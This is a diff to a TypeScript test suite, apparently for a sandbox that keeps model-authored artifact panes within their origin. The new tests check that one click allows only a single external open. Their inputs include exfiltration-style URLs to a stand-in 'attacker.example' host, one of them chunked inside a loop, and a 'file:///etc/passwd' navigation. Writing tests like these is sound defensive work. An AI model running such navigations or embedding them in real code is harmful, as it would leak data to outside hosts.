@@ -150,7 +150,9 @@ describe('confining a surface to its artifact', () => {
   function contents(activated = false) {
     const opened: string[] = [];
     const handoff = {
-      activated: () => activated,
+      // Spends the press, as the real tracker does: these cases are about what
+      // the fence does with an answer, and one of them is about asking twice.
+      takeActivation: () => { const had = activated; activated = false; return had; },
       externalAllowed: (url: string) => new URL(url).protocol === 'https:',
       openExternal: (url: string) => { opened.push(url); },
     };
@@ -227,6 +229,39 @@ describe('confining a surface to its artifact', () => {
     // because then a person would be looking at a page that is not the artifact
     // inside a pane that says it is.
     expect(event.preventDefault).toHaveBeenCalledOnce();
+    expect(surface.opened).toEqual(['https://example.com/docs']);
+  });
+
+  it('spends the press on the first departure, so one click is not a loop of them', () => {
+    // Model-authored code answering one click with a loop of `window.open`
+    // calls would otherwise put an unbounded number of URLs — and so an
+    // unbounded amount of what the page can see — through the system opener.
+    const surface = contents(true);
+    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
+    for (let index = 0; index < 5; index += 1) {
+      surface.openWindow(`https://attacker.example/?chunk=${index}`);
+    }
+
+    expect(surface.opened).toEqual(['https://attacker.example/?chunk=0']);
+  });
+
+  it('leaves the press unspent when the navigation is refused for another reason', () => {
+    // A blocked scheme must not cost somebody the click they were about to use
+    // on the link beside it.
+    const surface = contents(true);
+    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
+    surface.handlers.navigate?.({ preventDefault: vi.fn() }, 'file:///etc/passwd');
+    surface.handlers.navigate?.({ preventDefault: vi.fn() }, 'https://example.com/docs');
+
+    expect(surface.opened).toEqual(['https://example.com/docs']);
+  });
+
+  it('does not spend the press on a refused redirect', () => {
+    const surface = contents(true);
+    confineToArtifactOrigin(surface.stub as never, ORIGIN, surface.handoff);
+    surface.handlers.redirect?.({ preventDefault: vi.fn() }, 'https://attacker.example/leak');
+    surface.handlers.navigate?.({ preventDefault: vi.fn() }, 'https://example.com/docs');
+
     expect(surface.opened).toEqual(['https://example.com/docs']);
   });
 
@@ -326,6 +361,20 @@ describe('a surface’s transient user activation', () => {
     // A click five seconds ago is not the click that started this navigation;
     // a page that waited out the window is navigating on its own account.
     expect(activation.active()).toBe(false);
+  });
+
+  it('reports a press once and spends it', () => {
+    const time = clock();
+    const activation = new ArtifactUserActivation(time.now);
+    activation.record('mouseUp');
+
+    expect(activation.take()).toBe(true);
+    expect(activation.take()).toBe(false);
+    expect(activation.active()).toBe(false);
+
+    // The next press re-arms it: a person who clicks again has asked again.
+    activation.record('mouseUp');
+    expect(activation.take()).toBe(true);
   });
 
   it('reads a clock that moved backwards as inactive, not as a permanent activation', () => {
